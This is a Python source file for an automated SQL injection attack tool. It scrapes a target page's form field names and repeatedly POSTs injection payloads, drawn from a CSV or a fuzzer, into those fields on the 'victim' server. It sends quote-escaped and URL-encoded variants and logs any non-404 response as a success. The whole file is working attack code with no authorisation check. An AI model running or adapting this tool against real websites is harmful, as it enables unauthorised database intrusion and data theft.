from bs4 import BeautifulSoup
import requests
import re
from Display import *
from pull_from_CSV import *
from fuzzer import *
from urllib.parse import quote

#searches html page for any potential forms 
#generates and executes POST requests to the victim webserver
def POST_generator(url, fuzz_flag):

    URL = url
    r = requests.get(URL)
    html_bytes = r.text

   #bsoup allows for ease of html parsing and provides general formatting
    soup =  BeautifulSoup(html_bytes, 'lxml')
    token = soup.find_all('input')

    #regex that is used to search for name fields in html
    pattern = "((name=)([\"])\w*([\"]))"
    list_input_names = []
    form_inputs = []

    #actual html tag and field search done via the re.findall call
    #those found are sent to - list_input_names
    for i in token:
        try:
            found = re.findall(pattern, str(i))
            list_input_names.append(found[0][0])
        except:
            print("No name field found.")

    for i in list_input_names:
	#re.findall call looks for all name tags that satisfy the regex constraint
        form_inputs.append(re.findall(r'"(.*?)"',i)[0])

    #self explanatory but checks if we've been provided a single field or if there are mutliple for us to try
    if(len(form_inputs) > 2):

        #here we're going to loop and keep sending injection attempts to the POST_send function
        for n in range(len(form_inputs)):
            if (n + 1 < len(form_inputs)):

                #if the fuzzing option has been selected we call our fuzzer
                if(fuzz_flag):
                    payload = fuzz()
                else:
                    payload = pull_from_CSV()
                
                #writes out the attack but also tries both a quote escaped version and non quote escaped version 
                for x,y in payload.items():
                    print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
                    POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
                    POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
                    POST_send(URL, form_inputs[n], form_inputs[n+1], quote("' ")+y, quote("' ")+y)

    #same as the block prior
    else:
        for n in range(len(form_inputs)):
            if(fuzz_flag):
                    payload = fuzz()
            else:
                payload = pull_from_CSV()
                for x,y in payload.items():
                    print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the form is: " + form_inputs[n])
                    POST_send_single(URL, form_inputs[n], y)
                    POST_send_single(URL, form_inputs[n], "' "+y)

#Actually sends the POST request with the payload/information as specified 
def POST_send(URL, username_field, password_field, username_input, password_input):
    
    payload = {username_field: username_input, password_field : password_input}
    victim = URL
    r = requests.post(victim, payload)
    
    #temp test code to write to file
    file = open("Fuzz_HTML", "a")
    file.write("Payload: " + username_input + "\n\n" + r.text + "\n\n")
    
    #for any non 404 status code we log it
    if(r.status_code != 404):
        file_success = open("Successes", "a")
        file_success.write("Payload: " + username_input + "\n\n" + r.text + "\n\n")

    #prints the status code and the attempted payload
    print(r.status_code)
    print("Payload: " + username_input + "\n\n where the URL is: " + URL + "\n\n")

#Actually sends the POST request with the payload/information as specified 
def POST_send_single(URL, field, input):
    
    payload = {field: input}
    victim = URL
    r = requests.post(victim, payload)
    
    #temp test code to write to file
    file = open("Non_fuzz_HTML.txt", "a")
    file.write("Payload: " + input + "\n\n" + r.text + "\n\n")

    #for any non 404 status code we log it
    if(r.status_code != 404):
        file_success = open("Successes", "a")
        file_success.write("Payload: " + input + "\n\n where the URL is: " + URL + "\n\n")

    print(r.status_code)
    print("Payload: " + input + "\n\n where the URL is: " + URL + "\n\n")